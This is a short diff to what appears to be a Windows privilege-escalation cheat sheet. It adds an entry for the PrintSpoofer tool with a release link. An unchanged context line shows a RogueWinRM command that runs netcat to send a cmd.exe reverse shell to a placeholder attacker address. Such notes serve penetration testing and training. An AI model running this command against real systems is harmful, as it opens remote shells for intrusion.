@@ -55,3 +55,7 @@
 #### 1: Start listener
 
 #### c:\path\to\roguewinrm\roguewinrm.exe -p "C:\path\to\nc64.exe" -a "-e cmd.exe ATTACK_IP PORT"
+
+## Tool: PrintSpoofer
+
+## Link: https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0
